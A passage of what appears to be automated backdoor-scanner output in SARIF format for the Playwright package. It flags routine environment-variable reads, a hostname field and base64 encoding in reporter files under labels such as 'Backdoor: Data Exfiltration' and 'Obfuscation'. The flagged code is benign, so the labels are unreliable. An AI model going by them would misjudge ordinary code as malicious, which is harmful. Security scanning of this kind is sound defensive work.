                      "text": "}\nfunction getHtmlReportOptionProcessEnv() {\n  // Note: PW_TEST_HTML_REPORT_OPEN is for backwards compatibility.\n  const htmlOpenEnv = process.env.PLAYWRIGHT_HTML_OPEN || process.env.PW_TEST_HTML_REPORT_OPEN;\n  if (!htmlOpenEnv) return undefined;\n  if (!isHtmlReportOption(htmlOpenEnv)) {\n    console.log(_base.colors.red(`Configuration Error: HTML reporter Invalid value for PLAYWRIGHT_HTML_OPEN: ${htmlOpenEnv}. Valid values are: ${htmlReportOptions.join(', ')}`));\n",
                      "markdown": "`}\nfunction getHtmlReportOptionProcessEnv() {\n  // Note: PW_TEST_HTML_REPORT_OPEN is for backwards compatibility.\n  const htmlOpenEnv = process.env.PLAYWRIGHT_HTML_OPEN || process.env.PW_TEST_HTML_REPORT_OPEN;\n  if (!htmlOpenEnv) return undefined;\n  if (!isHtmlReportOption(htmlOpenEnv)) {\n    console.log(_base.colors.red(`Configuration Error: HTML reporter Invalid value for PLAYWRIGHT_HTML_OPEN: ${htmlOpenEnv}. Valid values are: ${htmlReportOptions.join(', ')}`));\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/reporters/html.js"
                },
                "region": {
                  "startLine": 139,
                  "startColumn": 61,
                  "endLine": 139,
                  "endColumn": 72,
                  "snippet": {
                    "text": "}\nfunction reportFolderFromEnv() {\n  // Note: PLAYWRIGHT_HTML_REPORT is for backwards compatibility.\n  const envValue = process.env.PLAYWRIGHT_HTML_OUTPUT_DIR || process.env.PLAYWRIGHT_HTML_REPORT;\n  return envValue ? _path.default.resolve(envValue) : undefined;\n}\nfunction getHtmlReportOptionProcessEnv() {\n",
                    "rendered": {
                      "text": "}\nfunction reportFolderFromEnv() {\n  // Note: PLAYWRIGHT_HTML_REPORT is for backwards compatibility.\n  const envValue = process.env.PLAYWRIGHT_HTML_OUTPUT_DIR || process.env.PLAYWRIGHT_HTML_REPORT;\n  return envValue ? _path.default.resolve(envValue) : undefined;\n}\nfunction getHtmlReportOptionProcessEnv() {\n",
                      "markdown": "`}\nfunction reportFolderFromEnv() {\n  // Note: PLAYWRIGHT_HTML_REPORT is for backwards compatibility.\n  const envValue = process.env.PLAYWRIGHT_HTML_OUTPUT_DIR || process.env.PLAYWRIGHT_HTML_REPORT;\n  return envValue ? _path.default.resolve(envValue) : undefined;\n}\nfunction getHtmlReportOptionProcessEnv() {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/reporters/html.js"
                },
                "region": {
                  "startLine": 139,
                  "startColumn": 19,
                  "endLine": 139,
                  "endColumn": 30,
                  "snippet": {
                    "text": "}\nfunction reportFolderFromEnv() {\n  // Note: PLAYWRIGHT_HTML_REPORT is for backwards compatibility.\n  const envValue = process.env.PLAYWRIGHT_HTML_OUTPUT_DIR || process.env.PLAYWRIGHT_HTML_REPORT;\n  return envValue ? _path.default.resolve(envValue) : undefined;\n}\nfunction getHtmlReportOptionProcessEnv() {\n",
                    "rendered": {
                      "text": "}\nfunction reportFolderFromEnv() {\n  // Note: PLAYWRIGHT_HTML_REPORT is for backwards compatibility.\n  const envValue = process.env.PLAYWRIGHT_HTML_OUTPUT_DIR || process.env.PLAYWRIGHT_HTML_REPORT;\n  return envValue ? _path.default.resolve(envValue) : undefined;\n}\nfunction getHtmlReportOptionProcessEnv() {\n",
                      "markdown": "`}\nfunction reportFolderFromEnv() {\n  // Note: PLAYWRIGHT_HTML_REPORT is for backwards compatibility.\n  const envValue = process.env.PLAYWRIGHT_HTML_OUTPUT_DIR || process.env.PLAYWRIGHT_HTML_REPORT;\n  return envValue ? _path.default.resolve(envValue) : undefined;\n}\nfunction getHtmlReportOptionProcessEnv() {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/reporters/html.js"
                },
                "region": {
                  "startLine": 116,
                  "startColumn": 8,
                  "endLine": 116,
                  "endColumn": 19,
                  "snippet": {
                    "text": "    this._buildResult = await builder.build(this.config.metadata, projectSuites, result, this._topLevelErrors);\n  }\n  async onExit() {\n    if (process.env.CI || !this._buildResult) return;\n    const {\n      ok,\n      singleTestId\n",
                    "rendered": {
                      "text": "    this._buildResult = await builder.build(this.config.metadata, projectSuites, result, this._topLevelErrors);\n  }\n  async onExit() {\n    if (process.env.CI || !this._buildResult) return;\n    const {\n      ok,\n      singleTestId\n",
                      "markdown": "`    this._buildResult = await builder.build(this.config.metadata, projectSuites, result, this._topLevelErrors);\n  }\n  async onExit() {\n    if (process.env.CI || !this._buildResult) return;\n    const {\n      ok,\n      singleTestId\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/reporters/html.js"
                },
                "region": {
                  "startLine": 99,
                  "startColumn": 48,
                  "endLine": 99,
                  "endColumn": 59,
                  "snippet": {
                    "text": "      open: getHtmlReportOptionProcessEnv() || this._options.open || 'on-failure',\n      attachmentsBaseURL: process.env.PLAYWRIGHT_HTML_ATTACHMENTS_BASE_URL || this._options.attachmentsBaseURL || 'data/',\n      host: process.env.PLAYWRIGHT_HTML_HOST || this._options.host,\n      port: process.env.PLAYWRIGHT_HTML_PORT ? +process.env.PLAYWRIGHT_HTML_PORT : this._options.port\n    };\n  }\n  _isSubdirectory(parentDir, dir) {\n",
                    "rendered": {
                      "text": "      open: getHtmlReportOptionProcessEnv() || this._options.open || 'on-failure',\n      attachmentsBaseURL: process.env.PLAYWRIGHT_HTML_ATTACHMENTS_BASE_URL || this._options.attachmentsBaseURL || 'data/',\n      host: process.env.PLAYWRIGHT_HTML_HOST || this._options.host,\n      port: process.env.PLAYWRIGHT_HTML_PORT ? +process.env.PLAYWRIGHT_HTML_PORT : this._options.port\n    };\n  }\n  _isSubdirectory(parentDir, dir) {\n",
                      "markdown": "`      open: getHtmlReportOptionProcessEnv() || this._options.open || 'on-failure',\n      attachmentsBaseURL: process.env.PLAYWRIGHT_HTML_ATTACHMENTS_BASE_URL || this._options.attachmentsBaseURL || 'data/',\n      host: process.env.PLAYWRIGHT_HTML_HOST || this._options.host,\n      port: process.env.PLAYWRIGHT_HTML_PORT ? +process.env.PLAYWRIGHT_HTML_PORT : this._options.port\n    };\n  }\n  _isSubdirectory(parentDir, dir) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/reporters/html.js"
                },
                "region": {
                  "startLine": 99,
                  "startColumn": 12,
                  "endLine": 99,
                  "endColumn": 23,
                  "snippet": {
                    "text": "      open: getHtmlReportOptionProcessEnv() || this._options.open || 'on-failure',\n      attachmentsBaseURL: process.env.PLAYWRIGHT_HTML_ATTACHMENTS_BASE_URL || this._options.attachmentsBaseURL || 'data/',\n      host: process.env.PLAYWRIGHT_HTML_HOST || this._options.host,\n      port: process.env.PLAYWRIGHT_HTML_PORT ? +process.env.PLAYWRIGHT_HTML_PORT : this._options.port\n    };\n  }\n  _isSubdirectory(parentDir, dir) {\n",
                    "rendered": {
                      "text": "      open: getHtmlReportOptionProcessEnv() || this._options.open || 'on-failure',\n      attachmentsBaseURL: process.env.PLAYWRIGHT_HTML_ATTACHMENTS_BASE_URL || this._options.attachmentsBaseURL || 'data/',\n      host: process.env.PLAYWRIGHT_HTML_HOST || this._options.host,\n      port: process.env.PLAYWRIGHT_HTML_PORT ? +process.env.PLAYWRIGHT_HTML_PORT : this._options.port\n    };\n  }\n  _isSubdirectory(parentDir, dir) {\n",
                      "markdown": "`      open: getHtmlReportOptionProcessEnv() || this._options.open || 'on-failure',\n      attachmentsBaseURL: process.env.PLAYWRIGHT_HTML_ATTACHMENTS_BASE_URL || this._options.attachmentsBaseURL || 'data/',\n      host: process.env.PLAYWRIGHT_HTML_HOST || this._options.host,\n      port: process.env.PLAYWRIGHT_HTML_PORT ? +process.env.PLAYWRIGHT_HTML_PORT : this._options.port\n    };\n  }\n  _isSubdirectory(parentDir, dir) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/reporters/html.js"
                },
                "region": {
                  "startLine": 98,
                  "startColumn": 12,
                  "endLine": 98,
                  "endColumn": 23,
                  "snippet": {
                    "text": "      outputFolder,\n      open: getHtmlReportOptionProcessEnv() || this._options.open || 'on-failure',\n      attachmentsBaseURL: process.env.PLAYWRIGHT_HTML_ATTACHMENTS_BASE_URL || this._options.attachmentsBaseURL || 'data/',\n      host: process.env.PLAYWRIGHT_HTML_HOST || this._options.host,\n      port: process.env.PLAYWRIGHT_HTML_PORT ? +process.env.PLAYWRIGHT_HTML_PORT : this._options.port\n    };\n  }\n",
                    "rendered": {
                      "text": "      outputFolder,\n      open: getHtmlReportOptionProcessEnv() || this._options.open || 'on-failure',\n      attachmentsBaseURL: process.env.PLAYWRIGHT_HTML_ATTACHMENTS_BASE_URL || this._options.attachmentsBaseURL || 'data/',\n      host: process.env.PLAYWRIGHT_HTML_HOST || this._options.host,\n      port: process.env.PLAYWRIGHT_HTML_PORT ? +process.env.PLAYWRIGHT_HTML_PORT : this._options.port\n    };\n  }\n",
                      "markdown": "`      outputFolder,\n      open: getHtmlReportOptionProcessEnv() || this._options.open || 'on-failure',\n      attachmentsBaseURL: process.env.PLAYWRIGHT_HTML_ATTACHMENTS_BASE_URL || this._options.attachmentsBaseURL || 'data/',\n      host: process.env.PLAYWRIGHT_HTML_HOST || this._options.host,\n      port: process.env.PLAYWRIGHT_HTML_PORT ? +process.env.PLAYWRIGHT_HTML_PORT : this._options.port\n    };\n  }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/reporters/html.js"
                },
                "region": {
                  "startLine": 97,
                  "startColumn": 26,
                  "endLine": 97,
                  "endColumn": 37,
                  "snippet": {
                    "text": "    return {\n      outputFolder,\n      open: getHtmlReportOptionProcessEnv() || this._options.open || 'on-failure',\n      attachmentsBaseURL: process.env.PLAYWRIGHT_HTML_ATTACHMENTS_BASE_URL || this._options.attachmentsBaseURL || 'data/',\n      host: process.env.PLAYWRIGHT_HTML_HOST || this._options.host,\n      port: process.env.PLAYWRIGHT_HTML_PORT ? +process.env.PLAYWRIGHT_HTML_PORT : this._options.port\n    };\n",
                    "rendered": {
                      "text": "    return {\n      outputFolder,\n      open: getHtmlReportOptionProcessEnv() || this._options.open || 'on-failure',\n      attachmentsBaseURL: process.env.PLAYWRIGHT_HTML_ATTACHMENTS_BASE_URL || this._options.attachmentsBaseURL || 'data/',\n      host: process.env.PLAYWRIGHT_HTML_HOST || this._options.host,\n      port: process.env.PLAYWRIGHT_HTML_PORT ? +process.env.PLAYWRIGHT_HTML_PORT : this._options.port\n    };\n",
                      "markdown": "`    return {\n      outputFolder,\n      open: getHtmlReportOptionProcessEnv() || this._options.open || 'on-failure',\n      attachmentsBaseURL: process.env.PLAYWRIGHT_HTML_ATTACHMENTS_BASE_URL || this._options.attachmentsBaseURL || 'data/',\n      host: process.env.PLAYWRIGHT_HTML_HOST || this._options.host,\n      port: process.env.PLAYWRIGHT_HTML_PORT ? +process.env.PLAYWRIGHT_HTML_PORT : this._options.port\n    };\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/reporters/junit.js"
                },
                "region": {
                  "startLine": 69,
                  "startColumn": 14,
                  "endLine": 69,
                  "endColumn": 25,
                  "snippet": {
                    "text": "      name: 'testsuites',\n      attributes: {\n        id: process.env[`PLAYWRIGHT_JUNIT_SUITE_ID`] || '',\n        name: process.env[`PLAYWRIGHT_JUNIT_SUITE_NAME`] || '',\n        tests: self.totalTests,\n        failures: self.totalFailures,\n        skipped: self.totalSkipped,\n",
                    "rendered": {
                      "text": "      name: 'testsuites',\n      attributes: {\n        id: process.env[`PLAYWRIGHT_JUNIT_SUITE_ID`] || '',\n        name: process.env[`PLAYWRIGHT_JUNIT_SUITE_NAME`] || '',\n        tests: self.totalTests,\n        failures: self.totalFailures,\n        skipped: self.totalSkipped,\n",
                      "markdown": "`      name: 'testsuites',\n      attributes: {\n        id: process.env[`PLAYWRIGHT_JUNIT_SUITE_ID`] || '',\n        name: process.env[`PLAYWRIGHT_JUNIT_SUITE_NAME`] || '',\n        tests: self.totalTests,\n        failures: self.totalFailures,\n        skipped: self.totalSkipped,\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/reporters/junit.js"
                },
                "region": {
                  "startLine": 68,
                  "startColumn": 12,
                  "endLine": 68,
                  "endColumn": 23,
                  "snippet": {
                    "text": "    const root = {\n      name: 'testsuites',\n      attributes: {\n        id: process.env[`PLAYWRIGHT_JUNIT_SUITE_ID`] || '',\n        name: process.env[`PLAYWRIGHT_JUNIT_SUITE_NAME`] || '',\n        tests: self.totalTests,\n        failures: self.totalFailures,\n",
                    "rendered": {
                      "text": "    const root = {\n      name: 'testsuites',\n      attributes: {\n        id: process.env[`PLAYWRIGHT_JUNIT_SUITE_ID`] || '',\n        name: process.env[`PLAYWRIGHT_JUNIT_SUITE_NAME`] || '',\n        tests: self.totalTests,\n        failures: self.totalFailures,\n",
                      "markdown": "`    const root = {\n      name: 'testsuites',\n      attributes: {\n        id: process.env[`PLAYWRIGHT_JUNIT_SUITE_ID`] || '',\n        name: process.env[`PLAYWRIGHT_JUNIT_SUITE_NAME`] || '',\n        tests: self.totalTests,\n        failures: self.totalFailures,\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/reporters/junit.js"
                },
                "region": {
                  "startLine": 44,
                  "startColumn": 63,
                  "endLine": 44,
                  "endColumn": 89,
                  "snippet": {
                    "text": "    this.stripANSIControlSequences = false;\n    this.includeProjectInTestName = false;\n    this.stripANSIControlSequences = (0, _utils.getAsBooleanFromENV)('PLAYWRIGHT_JUNIT_STRIP_ANSI', !!options.stripANSIControlSequences);\n    this.includeProjectInTestName = (0, _utils.getAsBooleanFromENV)('PLAYWRIGHT_JUNIT_INCLUDE_PROJECT_IN_TEST_NAME', !!options.includeProjectInTestName);\n    this.configDir = options.configDir;\n    this.resolvedOutputFile = (_resolveOutputFile = (0, _base.resolveOutputFile)('JUNIT', options)) === null || _resolveOutputFile === void 0 ? void 0 : _resolveOutputFile.outputFile;\n  }\n",
                    "rendered": {
                      "text": "    this.stripANSIControlSequences = false;\n    this.includeProjectInTestName = false;\n    this.stripANSIControlSequences = (0, _utils.getAsBooleanFromENV)('PLAYWRIGHT_JUNIT_STRIP_ANSI', !!options.stripANSIControlSequences);\n    this.includeProjectInTestName = (0, _utils.getAsBooleanFromENV)('PLAYWRIGHT_JUNIT_INCLUDE_PROJECT_IN_TEST_NAME', !!options.includeProjectInTestName);\n    this.configDir = options.configDir;\n    this.resolvedOutputFile = (_resolveOutputFile = (0, _base.resolveOutputFile)('JUNIT', options)) === null || _resolveOutputFile === void 0 ? void 0 : _resolveOutputFile.outputFile;\n  }\n",
                      "markdown": "`    this.stripANSIControlSequences = false;\n    this.includeProjectInTestName = false;\n    this.stripANSIControlSequences = (0, _utils.getAsBooleanFromENV)('PLAYWRIGHT_JUNIT_STRIP_ANSI', !!options.stripANSIControlSequences);\n    this.includeProjectInTestName = (0, _utils.getAsBooleanFromENV)('PLAYWRIGHT_JUNIT_INCLUDE_PROJECT_IN_TEST_NAME', !!options.includeProjectInTestName);\n    this.configDir = options.configDir;\n    this.resolvedOutputFile = (_resolveOutputFile = (0, _base.resolveOutputFile)('JUNIT', options)) === null || _resolveOutputFile === void 0 ? void 0 : _resolveOutputFile.outputFile;\n  }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/reporters/junit.js"
                },
                "region": {
                  "startLine": 111,
                  "startColumn": 8,
                  "endLine": 111,
                  "endColumn": 16,
                  "snippet": {
                    "text": "      attributes: {\n        name: suite.title,\n        timestamp: this.timestamp.toISOString(),\n        hostname: projectName,\n        tests,\n        failures,\n        skipped,\n",
                    "rendered": {
                      "text": "      attributes: {\n        name: suite.title,\n        timestamp: this.timestamp.toISOString(),\n        hostname: projectName,\n        tests,\n        failures,\n        skipped,\n",
                      "markdown": "`      attributes: {\n        name: suite.title,\n        timestamp: this.timestamp.toISOString(),\n        hostname: projectName,\n        tests,\n        failures,\n        skipped,\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/reporters/line.js"
                },
                "region": {
                  "startLine": 103,
                  "startColumn": 9,
                  "endLine": 103,
                  "endColumn": 20,
                  "snippet": {
                    "text": "    console.log();\n  }\n  async onEnd(result) {\n    if (!process.env.PW_TEST_DEBUG_REPORTERS && this._didBegin) process.stdout.write(`\\u001B[1A\\u001B[2K`);\n    await super.onEnd(result);\n    this.epilogue(false);\n  }\n",
                    "rendered": {
                      "text": "    console.log();\n  }\n  async onEnd(result) {\n    if (!process.env.PW_TEST_DEBUG_REPORTERS && this._didBegin) process.stdout.write(`\\u001B[1A\\u001B[2K`);\n    await super.onEnd(result);\n    this.epilogue(false);\n  }\n",
                      "markdown": "`    console.log();\n  }\n  async onEnd(result) {\n    if (!process.env.PW_TEST_DEBUG_REPORTERS && this._didBegin) process.stdout.write(`\\u001B[1A\\u001B[2K`);\n    await super.onEnd(result);\n    this.epilogue(false);\n  }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/reporters/line.js"
                },
                "region": {
                  "startLine": 98,
                  "startColumn": 9,
                  "endLine": 98,
                  "endColumn": 20,
                  "snippet": {
                    "text": "  onError(error) {\n    super.onError(error);\n    const message = (0, _base.formatError)(error, _base.colors.enabled).message + '\\n';\n    if (!process.env.PW_TEST_DEBUG_REPORTERS && this._didBegin) process.stdout.write(`\\u001B[1A\\u001B[2K`);\n    process.stdout.write(message);\n    console.log();\n  }\n",
                    "rendered": {
                      "text": "  onError(error) {\n    super.onError(error);\n    const message = (0, _base.formatError)(error, _base.colors.enabled).message + '\\n';\n    if (!process.env.PW_TEST_DEBUG_REPORTERS && this._didBegin) process.stdout.write(`\\u001B[1A\\u001B[2K`);\n    process.stdout.write(message);\n    console.log();\n  }\n",
                      "markdown": "`  onError(error) {\n    super.onError(error);\n    const message = (0, _base.formatError)(error, _base.colors.enabled).message + '\\n';\n    if (!process.env.PW_TEST_DEBUG_REPORTERS && this._didBegin) process.stdout.write(`\\u001B[1A\\u001B[2K`);\n    process.stdout.write(message);\n    console.log();\n  }\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/reporters/line.js"
                },
                "region": {
                  "startLine": 93,
                  "startColumn": 8,
                  "endLine": 93,
                  "endColumn": 19,
                  "snippet": {
                    "text": "    const prefix = `[${this._current}/${this.totalTestCount}]${retriesPrefix} `;\n    const currentRetrySuffix = result.retry ? _base.colors.yellow(` (retry #${result.retry})`) : '';\n    const title = (0, _base.formatTestTitle)(this.config, test, step) + currentRetrySuffix;\n    if (process.env.PW_TEST_DEBUG_REPORTERS) process.stdout.write(`${prefix + title}\\n`);else process.stdout.write(`\\u001B[1A\\u001B[2K${prefix + this.fitToScreen(title, prefix)}\\n`);\n  }\n  onError(error) {\n    super.onError(error);\n",
                    "rendered": {
                      "text": "    const prefix = `[${this._current}/${this.totalTestCount}]${retriesPrefix} `;\n    const currentRetrySuffix = result.retry ? _base.colors.yellow(` (retry #${result.retry})`) : '';\n    const title = (0, _base.formatTestTitle)(this.config, test, step) + currentRetrySuffix;\n    if (process.env.PW_TEST_DEBUG_REPORTERS) process.stdout.write(`${prefix + title}\\n`);else process.stdout.write(`\\u001B[1A\\u001B[2K${prefix + this.fitToScreen(title, prefix)}\\n`);\n  }\n  onError(error) {\n    super.onError(error);\n",
                      "markdown": "`    const prefix = `[${this._current}/${this.totalTestCount}]${retriesPrefix} `;\n    const currentRetrySuffix = result.retry ? _base.colors.yellow(` (retry #${result.retry})`) : '';\n    const title = (0, _base.formatTestTitle)(this.config, test, step) + currentRetrySuffix;\n    if (process.env.PW_TEST_DEBUG_REPORTERS) process.stdout.write(`${prefix + title}\\n`);else process.stdout.write(`\\u001B[1A\\u001B[2K${prefix + this.fitToScreen(title, prefix)}\\n`);\n  }\n  onError(error) {\n    super.onError(error);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/reporters/line.js"
                },
                "region": {
                  "startLine": 81,
                  "startColumn": 11,
                  "endLine": 81,
                  "endColumn": 22,
                  "snippet": {
                    "text": "  onTestEnd(test, result) {\n    super.onTestEnd(test, result);\n    if (!this.willRetry(test) && (test.outcome() === 'flaky' || test.outcome() === 'unexpected' || result.status === 'interrupted')) {\n      if (!process.env.PW_TEST_DEBUG_REPORTERS) process.stdout.write(`\\u001B[1A\\u001B[2K`);\n      console.log((0, _base.formatFailure)(this.config, test, {\n        index: ++this._failures\n      }).message);\n",
                    "rendered": {
                      "text": "  onTestEnd(test, result) {\n    super.onTestEnd(test, result);\n    if (!this.willRetry(test) && (test.outcome() === 'flaky' || test.outcome() === 'unexpected' || result.status === 'interrupted')) {\n      if (!process.env.PW_TEST_DEBUG_REPORTERS) process.stdout.write(`\\u001B[1A\\u001B[2K`);\n      console.log((0, _base.formatFailure)(this.config, test, {\n        index: ++this._failures\n      }).message);\n",
                      "markdown": "`  onTestEnd(test, result) {\n    super.onTestEnd(test, result);\n    if (!this.willRetry(test) && (test.outcome() === 'flaky' || test.outcome() === 'unexpected' || result.status === 'interrupted')) {\n      if (!process.env.PW_TEST_DEBUG_REPORTERS) process.stdout.write(`\\u001B[1A\\u001B[2K`);\n      console.log((0, _base.formatFailure)(this.config, test, {\n        index: ++this._failures\n      }).message);\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000702"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Environment)",
            "id": "BD000702"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/reporters/line.js"
                },
                "region": {
                  "startLine": 54,
                  "startColumn": 9,
                  "endLine": 54,
                  "endColumn": 20,
                  "snippet": {
                    "text": "  }\n  _dumpToStdio(test, chunk, stream) {\n    if (this.config.quiet) return;\n    if (!process.env.PW_TEST_DEBUG_REPORTERS) stream.write(`\\u001B[1A\\u001B[2K`);\n    if (test && this._lastTest !== test) {\n      // Write new header for the output.\n      const title = _base.colors.dim((0, _base.formatTestTitle)(this.config, test));\n",
                    "rendered": {
                      "text": "  }\n  _dumpToStdio(test, chunk, stream) {\n    if (this.config.quiet) return;\n    if (!process.env.PW_TEST_DEBUG_REPORTERS) stream.write(`\\u001B[1A\\u001B[2K`);\n    if (test && this._lastTest !== test) {\n      // Write new header for the output.\n      const title = _base.colors.dim((0, _base.formatTestTitle)(this.config, test));\n",
                      "markdown": "`  }\n  _dumpToStdio(test, chunk, stream) {\n    if (this.config.quiet) return;\n    if (!process.env.PW_TEST_DEBUG_REPORTERS) stream.write(`\\u001B[1A\\u001B[2K`);\n    if (test && this._lastTest !== test) {\n      // Write new header for the output.\n      const title = _base.colors.dim((0, _base.formatTestTitle)(this.config, test));\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/js/playwright.zip/package/lib/reporters/json.js"
                },
                "region": {
                  "startLine": 233,
                  "startColumn": 24,
                  "endLine": 233,
                  "endColumn": 30,
                  "snippet": {
                    "text": "    text: s\n  };\n  return {\n    buffer: s.toString('base64')\n  };\n}\nfunction removePrivateFields(config) {\n",
                    "rendered": {
                      "text": "    text: s\n  };\n  return {\n    buffer: s.toString('base64')\n  };\n}\nfunction removePrivateFields(config) {\n",
                      "markdown": "`    text: s\n  };\n  return {\n    buffer: s.toString('base64')\n  };\n}\nfunction removePrivateFields(config) {\n`"
                    }
                  },
                  "sourceLanguage": "javascript"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 4
          }
        },
        {
          "rule": {
            "id": "BD000800"
          },
          "message": {
            "text": "Backdoor: Obfuscation",
            "id": "BD000800"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
